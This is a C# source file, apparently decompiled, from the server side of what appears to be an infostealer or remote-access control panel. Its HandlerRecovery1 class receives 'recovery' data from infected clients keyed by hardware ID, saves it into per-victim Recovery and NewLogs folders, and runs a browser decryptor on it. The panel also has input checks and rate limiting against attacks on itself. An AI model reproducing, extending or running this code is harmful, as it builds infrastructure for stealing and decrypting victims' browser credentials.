using System;
using System.Collections.Concurrent;
using System.Drawing;
using System.IO;
using System.Text.RegularExpressions;
using Server.Connectings;
using Server.Helper;
using Server.Messages;

internal class HandlerRecovery1
{
	private static readonly char[] InvalidPathChars = Path.GetInvalidPathChars();

	private static readonly char[] InvalidFileNameChars = Path.GetInvalidFileNameChars();

	private static readonly ConcurrentDictionary<string, DateTime> _lastRequestTime = new ConcurrentDictionary<string, DateTime>();

	private static readonly TimeSpan _requestCooldown = TimeSpan.FromSeconds(30.0);

	public static void Read(Clients clients, object[] array)
	{
		if (clients == null || array == null || array.Length < 3)
		{
			clients?.Disconnect();
			return;
		}
		string hwid = clients.Hwid;
		if (!string.IsNullOrEmpty(hwid) && !Regex.IsMatch(hwid, "^[0-9a-fA-F]{32}$"))
		{
			Methods.AppendLogs(clients.IP, "RCE Attack Blocked! (Recovery1)", Color.Red);
			clients.Disconnect();
			return;
		}
		if (!string.IsNullOrEmpty(hwid))
		{
			if (_lastRequestTime.TryGetValue(hwid, out var lastRequest) && DateTime.UtcNow - lastRequest < _requestCooldown)
			{
				Methods.AppendLogs(clients.IP, "RCE Attack Blocked! Spam detected from HWID: " + hwid, Color.Red);
				clients.Disconnect();
				return;
			}
			_lastRequestTime[hwid] = DateTime.UtcNow;
		}
		string userId = array[1] as string;
		object[] recoveryData = array[2] as object[];
		if (string.IsNullOrWhiteSpace(userId) || recoveryData == null)
		{
			clients.Disconnect();
			return;
		}
		if (!Regex.IsMatch(userId, "^[0-9a-fA-F]{32}$"))
		{
			Methods.AppendLogs(clients.IP, "RCE Attack Blocked! (Recovery1)", Color.Red);
			clients.Disconnect();
			return;
		}
		if (userId.IndexOfAny(InvalidPathChars) >= 0 || userId.IndexOfAny(InvalidFileNameChars) >= 0)
		{
			clients.Disconnect();
			return;
		}
		if (userId.Contains("..") || userId.StartsWith(".") || userId.EndsWith("."))
		{
			clients.Disconnect();
			return;
		}
		string sanitizedUserId = SecurityHelper.SanitizeHwid(userId);
		if (string.IsNullOrWhiteSpace(sanitizedUserId) || sanitizedUserId == "InvalidHWID")
		{
			clients.Disconnect();
			return;
		}
		string userBasePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Users", sanitizedUserId);
		string recoveryPath = Path.Combine(userBasePath, "Recovery");
		string newLogsPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "NewLogs", sanitizedUserId);
		if (!SecurityHelper.IsSafePath(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Users"), sanitizedUserId))
		{
			clients.Disconnect();
			return;
		}
		try
		{
			Methods.AppendLogs(clients.IP, "Save logs in: " + recoveryPath, Color.MediumPurple);
			DynamicFiles.Save(recoveryPath, recoveryData);
			DynamicFiles.Save(newLogsPath, recoveryData);
			DecryptorBrowsers.Start(recoveryPath);
			DecryptorBrowsers.Start(newLogsPath);
			string sourceInfoFile = Path.Combine(userBasePath, "Information.txt");
			string destInfoFileNewLogs = Path.Combine(newLogsPath, "InformationLeb.txt");
			string destInfoFileRecovery = Path.Combine(recoveryPath, "InformationLeb.txt");
			if (File.Exists(sourceInfoFile))
			{
				string destDir1 = Path.GetDirectoryName(destInfoFileNewLogs);
				string destDir2 = Path.GetDirectoryName(destInfoFileRecovery);
				if (!string.IsNullOrEmpty(destDir1) && !Directory.Exists(destDir1))
				{
					Directory.CreateDirectory(destDir1);
				}
				if (!string.IsNullOrEmpty(destDir2) && !Directory.Exists(destDir2))
				{
					Directory.CreateDirectory(destDir2);
				}
				File.Copy(sourceInfoFile, destInfoFileNewLogs, overwrite: true);
				File.Copy(sourceInfoFile, destInfoFileRecovery, overwrite: true);
			}
		}
		catch
		{
		}
		finally
		{
			clients.Disconnect();
		}
	}
}
